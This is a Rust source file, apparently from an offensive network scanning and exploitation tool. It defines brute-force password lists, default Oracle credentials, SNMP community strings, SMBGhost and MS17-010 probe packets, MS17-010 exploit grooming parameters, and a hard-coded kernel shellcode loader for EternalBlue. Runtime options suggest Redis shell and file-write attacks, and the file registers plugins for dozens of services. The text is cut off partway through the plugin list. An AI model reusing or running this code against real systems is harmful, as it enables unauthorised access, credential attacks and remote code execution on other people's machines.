use aes::Aes128;
use amiquip::Connection as AmqpConnection;
use anyhow::{Context, Result};
use base64::Engine;
use cbc::Decryptor as Aes128CbcDecryptor;
use cbc::cipher::{BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
use des::Des;
use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
use oracle_rs::{Config as OracleConfig, Connection as OracleConnection};
use rdp::core::client::Connector as RdpConnector;
use reqwest::blocking::Client;
use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use rustls::{ClientConfig, ClientConnection, DigitallySignedStruct, SignatureScheme, StreamOwned};
use serde_json::{Value, json};
use sha1::{Digest, Sha1};
use smb2::{ClientConfig as Smb2ClientConfig, SmbClient as Smb2Client};
use std::cell::RefCell;
use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::convert::TryInto;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::{TcpStream, ToSocketAddrs, UdpSocket};
use std::path::PathBuf;
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant};

const DEFAULT_PASSWORDS: &[&str] = &[
    "123456",
    "admin",
    "admin123",
    "root",
    "",
    "pass123",
    "pass@123",
    "password",
    "Password",
    "P@ssword123",
    "123123",
    "654321",
    "111111",
    "123",
    "1",
    "admin@123",
    "Admin@123",
    "admin123!@#",
    "{user}",
    "{user}1",
    "{user}111",
    "{user}123",
    "{user}@123",
    "{user}_123",
    "{user}#123",
    "{user}@111",
    "{user}@2019",
    "{user}@123#4",
    "P@ssw0rd!",
    "P@ssw0rd",
    "Passw0rd",
    "qwe123",
    "12345678",
    "test",
    "test123",
    "123qwe",
    "123qwe!@#",
    "123456789",
    "123321",
    "666666",
    "a123456.",
    "123456~a",
    "123456!a",
    "000000",
    "1234567890",
    "8888888",
    "!QAZ2wsx",
    "1qaz2wsx",
    "abc123",
    "abc123456",
    "1qaz@WSX",
    "a11111",
    "a12345",
    "Aa1234",
    "Aa1234.",
    "Aa12345",
    "a123456",
    "a123123",
    "Aa123123",
    "Aa123456",
    "Aa12345.",
    "sysadmin",
    "system",
    "1qaz!QAZ",
    "2wsx@WSX",
    "qwe123!@#",
    "Aa123456!",
    "A123456s!",
    "sa123456",
    "1q2w3e",
    "Charge123",
    "Aa123456789",
    "elastic123",
];

const DEFAULT_SNMP_COMMUNITIES: &[&str] = &["public", "private", "cisco", "community"];
const ORACLE_COMMON_SERVICE_NAMES: &[&str] = &["XE", "ORCL", "ORCLPDB1", "XEPDB1", "PDBORCL"];
const ORACLE_HIGH_RISK_CREDENTIALS: &[(&str, &str)] = &[
    ("SYS", "123456"),
    ("SYSTEM", "123456"),
    ("SYS", "oracle"),
    ("SYSTEM", "oracle"),
    ("SYS", "password"),
    ("SYSTEM", "password"),
    ("SYS", "sys123"),
    ("SYS", "change_on_install"),
    ("SYSTEM", "manager"),
];
const SMBGHOST_PROBE: &[u8] = b"\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02\x22\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00";
const MS17010_NEGOTIATE_REQUEST_HEX: &str = "00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200";
const MS17010_SESSION_SETUP_REQUEST_HEX: &str = "00000088ff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a200000000000000000000000000000000000502ce0e0000000f00";
const MS17010_TRANS_NAMED_PIPE_REQUEST_HEX: &str = "0000004aff534d42250000000018012800000000000000000000000088ea30108529810000000000ffffffff0000000000000000000000004a0000004a000200230000000070005c504950455c00";
const MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX: &str = "0000004eff534d4232000000001807c00000000000000000000000008fffe0000841000f0c0000000010000000000000000a6d9a400000000c00420000004e0001000e000d0000000000000000000000000000";
const MS17010_AES_KEY: &[u8; 16] = b"0123456789abcdef";
const MS17010_PRESET_SOURCE: &str = include_str!("../assets/ms17010_presets.rs");
const MS17010_PACKET_MAX_LEN: usize = 4204;
const MS17010_PACKET_SETUP_LEN: usize = 497;
const MS17010_EXPLOIT_INITIAL_GROOMS: usize = 12;
const MS17010_EXPLOIT_MAX_ATTEMPTS: usize = 12;
const MS17010_EXPLOIT_SECOND_GROOMS: usize = 6;
const MS17010_EXPLOIT_BODY_FIRST_CHUNK: usize = 2920;
const MS17010_EXPLOIT_BODY_SECOND_END: usize = 4073;
const MS17010_SMB2_GROOM_HEADER: &[u8] = b"\x00\x00\xff\xf7\xfeSMB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
const MS17010_EXPLOIT_LOADER: &[u8] = &[
    0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
    0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
    0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
    0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
    0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
    0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
    0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
    0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
    0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
    0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
    0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
    0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
    0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
    0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
    0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
    0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
    0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
    0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
    0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
    0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
    0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
    0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
    0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
    0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
    0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
    0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
    0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
    0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
    0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
    0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
    0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
    0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
    0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
    0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
    0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
    0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
    0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
    0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
    0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
    0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
    0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
    0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
    0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
    0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
    0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
    0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
    0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
    0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
    0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
    0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
    0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
    0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
    0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
    0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
    0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
    0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
    0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
    0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
];
const FINDNET_PROBE_ONE: &[u8] = b"\x05\x00\x0b\x03\x10\x00\x00\x00H\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xc4\xfe\xfc\x99`R\x1b\x10\xbb\xcb\x00\xaa\x00!4z\x00\x00\x00\x00E\xd8\x88\xae\xb1\xcc\x91\x19\xfe\x80\x80\x02\xb1\x04\x86\x00\x02\x00\x00\x00";
const FINDNET_PROBE_TWO: &[u8] = b"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00";
const FINDNET_END_MARKER: &[u8] = b"\x09\x00\xff\xff\x00\x00";
const NETBIOS_UDP_PROBE: &[u8] = b"\x66\x66\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01";
const NETBIOS_SESSION_REQUEST_SUFFIX: &[u8] = b"\x00 EOENEBFACACACACACACACACACACACACA\x00";
const NETBIOS_NEGOTIATE_ONE: &[u8] = &[
    0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F,
    0x52, 0x4B, 0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02,
    0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x57, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x57, 0x6F, 0x72, 0x6B, 0x67, 0x72, 0x6F, 0x75, 0x70,
    0x73, 0x20, 0x33, 0x2E, 0x31, 0x61, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
    0x32, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x32, 0x2E, 0x31, 0x00, 0x02, 0x4E, 0x54,
    0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00,
];
const NETBIOS_NEGOTIATE_TWO: &[u8] = &[
    0x00, 0x00, 0x01, 0x0A, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
    0x00, 0x00, 0x40, 0x00, 0x0C, 0xFF, 0x00, 0x0A, 0x01, 0x04, 0x41, 0x32, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x00, 0x00, 0xA0, 0xCF, 0x00, 0x60,
    0x48, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x3E, 0x30, 0x3C, 0xA0, 0x0E, 0x30,
    0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, 0xA2, 0x2A, 0x04,
    0x28, 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x82, 0x08,
    0xA2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x05, 0x02, 0xCE, 0x0E, 0x00, 0x00, 0x00, 0x0F, 0x00,
];

#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct NetBiosInfo {
    computer_name: String,
    domain_name: String,
    netbios_domain: String,
    netbios_computer: String,
    workstation_service: String,
    server_service: String,
    domain_controllers: String,
    os_version: String,
    group_name: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OpenService {
    pub host: String,
    pub port: u16,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PluginContext {
    pub usernames: Vec<String>,
    pub passwords: Vec<String>,
    pub timeout_secs: u64,
    pub ssh_key_path: Option<PathBuf>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RedisRuntimeOptions {
    pub redis_file: Option<PathBuf>,
    pub redis_shell: Option<String>,
    pub disable_redis: bool,
    pub redis_write_path: Option<String>,
    pub redis_write_content: Option<String>,
    pub redis_write_file: Option<PathBuf>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct AuthRuntimeOptions {
    pub domain: Option<String>,
    pub hashes: Vec<String>,
    pub extra_usernames: Vec<String>,
    pub extra_passwords: Vec<String>,
    pub disable_brute: bool,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Ms17010RuntimeOptions {
    pub shellcode: Option<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ConnectionRuntimeOptions {
    pub max_retries: u8,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ServiceScanRuntimeOptions {
    pub module_threads: u16,
    pub global_timeout_secs: u64,
    pub log_errors: bool,
}

impl Default for ServiceScanRuntimeOptions {
    fn default() -> Self {
        Self {
            module_threads: 10,
            global_timeout_secs: 180,
            log_errors: false,
        }
    }
}

pub fn set_redis_runtime_options(options: RedisRuntimeOptions) {
    REDIS_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
}

pub fn set_auth_runtime_options(options: AuthRuntimeOptions) {
    AUTH_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
}

pub fn set_ms17010_runtime_options(options: Ms17010RuntimeOptions) {
    MS17010_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
}

pub fn set_connection_runtime_options(options: ConnectionRuntimeOptions) {
    CONNECTION_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
}

pub fn set_service_scan_runtime_options(options: ServiceScanRuntimeOptions) {
    SERVICE_SCAN_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
}

fn current_redis_runtime_options() -> RedisRuntimeOptions {
    REDIS_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
}

fn current_auth_runtime_options() -> AuthRuntimeOptions {
    AUTH_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
}

fn brute_force_disabled() -> bool {
    current_auth_runtime_options().disable_brute
}

fn current_ms17010_runtime_options() -> Ms17010RuntimeOptions {
    MS17010_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
}

fn current_connection_runtime_options() -> ConnectionRuntimeOptions {
    CONNECTION_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
}

fn current_service_scan_runtime_options() -> ServiceScanRuntimeOptions {
    SERVICE_SCAN_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
}

thread_local! {
    static REDIS_RUNTIME_OPTIONS: RefCell<RedisRuntimeOptions> = RefCell::new(RedisRuntimeOptions::default());
    static AUTH_RUNTIME_OPTIONS: RefCell<AuthRuntimeOptions> = RefCell::new(AuthRuntimeOptions::default());
    static MS17010_RUNTIME_OPTIONS: RefCell<Ms17010RuntimeOptions> = RefCell::new(Ms17010RuntimeOptions::default());
    static CONNECTION_RUNTIME_OPTIONS: RefCell<ConnectionRuntimeOptions> = RefCell::new(ConnectionRuntimeOptions::default());
    static SERVICE_SCAN_RUNTIME_OPTIONS: RefCell<ServiceScanRuntimeOptions> = RefCell::new(ServiceScanRuntimeOptions::default());
}

#[derive(Debug, Clone, PartialEq)]
pub struct PluginFinding {
    pub plugin: String,
    pub target: OpenService,
    pub status: String,
    pub details: BTreeMap<String, Value>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PluginDefinition {
    pub key: &'static str,
    pub name: &'static str,
    pub ports: &'static [u16],
    pub transport: Transport,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TelnetAccess {
    NoAuth,
    NeedsAuth,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Smb2AuthMode {
    Password,
    Hash,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Transport {
    Tcp,
    Udp,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ServiceScanTask {
    plugin_key: &'static str,
    target: OpenService,
}

pub fn registered_plugins() -> Vec<PluginDefinition> {
    vec![
        PluginDefinition {
            key: "ftp",
            name: "FTP",
            ports: &[21],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "ssh",
            name: "SSH",
            ports: &[22, 2222],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "smb",
            name: "SMB",
            ports: &[445],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "smb2",
            name: "SMB2",
            ports: &[445],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "telnet",
            name: "Telnet",
            ports: &[23],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "rdp",
            name: "RDP",
            ports: &[3389, 13389, 33389],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "findnet",
            name: "FindNet",
            ports: &[135],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "netbios",
            name: "NetBIOS",
            ports: &[139],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "smtp",
            name: "SMTP",
            ports: &[25, 465, 587],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "imap",
            name: "IMAP",
            ports: &[143, 993],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "pop3",
            name: "POP3",
            ports: &[110, 995],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "activemq",
            name: "ActiveMQ",
            ports: &[61613],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "rsync",
            name: "Rsync",
            ports: &[873],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "rabbitmq",
            name: "RabbitMQ",
            ports: &[5672, 5671, 15672, 15671],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "mongodb",
            name: "MongoDB",
            ports: &[27017, 27018],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "modbus",
            name: "Modbus",
            ports: &[502, 5020],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "ldap",
            name: "LDAP",
            ports: &[389, 636],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "vnc",
            name: "VNC",
            ports: &[5900, 5901, 5902],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "ms17010",
            name: "MS17010",
            ports: &[445],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "smbghost",
            name: "SMBGhost",
            ports: &[445],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "kafka",
            name: "Kafka",
            ports: &[9092, 9093],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "mssql",
            name: "MSSQL",
            ports: &[1433, 1434],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "oracle",
            name: "Oracle",
            ports: &[1521, 1522, 1526],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "mysql",
            name: "MySQL",
            ports: &[3306, 3307, 13306, 33306],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "postgres",
            name: "PostgreSQL",
            ports: &[5432, 5433],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "neo4j",
            name: "Neo4j",
            ports: &[7687],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "cassandra",
            name: "Cassandra",
            ports: &[9042],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "snmp",
            name: "SNMP",
            ports: &[161, 162],
            transport: Transport::Udp,
        },
        PluginDefinition {
            key: "redis",
            name: "Redis",
